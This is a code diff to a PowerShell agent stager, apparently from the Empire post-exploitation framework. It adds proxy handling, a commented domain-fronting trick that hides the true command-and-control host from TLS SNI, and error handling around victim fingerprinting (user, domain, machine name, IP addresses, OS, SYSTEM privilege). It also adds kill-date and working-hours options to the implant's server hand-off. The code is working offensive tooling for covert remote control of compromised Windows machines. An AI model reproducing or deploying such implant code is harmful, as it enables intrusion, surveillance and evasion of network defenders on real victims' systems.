@@ -4,20 +4,20 @@ function Start-Negotiate {
     function ConvertTo-RC4ByteStream {
         Param ($RCK, $In)
         begin {
-            [Byte[]] $S = 0..255;
+            [Byte[]] $Str = 0..255;
             $J = 0;
             0..255 | ForEach-Object {
-                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
-                $S[$_], $S[$J] = $S[$J], $S[$_];
+                $J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256;
+                $Str[$_], $Str[$J] = $Str[$J], $Str[$_];
             };
             $I = $J = 0;
         }
         process {
             ForEach($Byte in $In) {
                 $I = ($I + 1) % 256;
-                $J = ($J + $S[$I]) % 256;
-                $S[$I], $S[$J] = $S[$J], $S[$I];
-                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
+                $J = ($J + $Str[$I]) % 256;
+                $Str[$I], $Str[$J] = $Str[$J], $Str[$I];
+                $Byte -bxor $Str[($Str[$I] + $Str[$J]) % 256];
             }
         }
     }
@@ -101,12 +101,22 @@ function Start-Negotiate {
         $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
         $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
     }
+
+    if ($Script:Proxy) {
+        $wc.Proxy = $Script:Proxy;   
+    }
+
+    
     # the User-Agent always resets for multiple calls...silly
     if ($customHeaders -ne "") {
         $headers = $customHeaders -split ',';
         $headers | ForEach-Object {
             $headerKey = $_.split(':')[0];
             $headerValue = $_.split(':')[1];
+	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
+	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+	    if ($headerKey -eq "host"){
+                try{$ig=$WC.DownloadData($s)}catch{}};
             $wc.Headers.Add($headerKey, $headerValue);
         }
     }
@@ -150,14 +160,26 @@ function Start-Negotiate {
 
     # get some basic system information
     $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
-    $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
+
+    try{
+        $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
+    }
+    catch {
+        $p = "[FAILED]"
+    }
+   
 
     # check if the IP is a string or the [IPv4,IPv6] array
     $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
     if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
     $i+="|$ip";
 
-    $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
+    try{
+        $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
+    }
+    catch{
+        $i+='|'+'[FAILED]'
+    }
 
     # detect if we're SYSTEM or otherwise high-integrity
     if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}
@@ -192,6 +214,10 @@ function Start-Negotiate {
         $headers | ForEach-Object {
             $headerKey = $_.split(':')[0];
             $headerValue = $_.split(':')[1];
+	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
+	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+	    if ($headerKey -eq "host"){
+                try{$ig=$WC.DownloadData($s)}catch{}};
             $wc.Headers.Add($headerKey, $headerValue);
         }
     }
@@ -210,7 +236,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID;
+    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
 Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u;
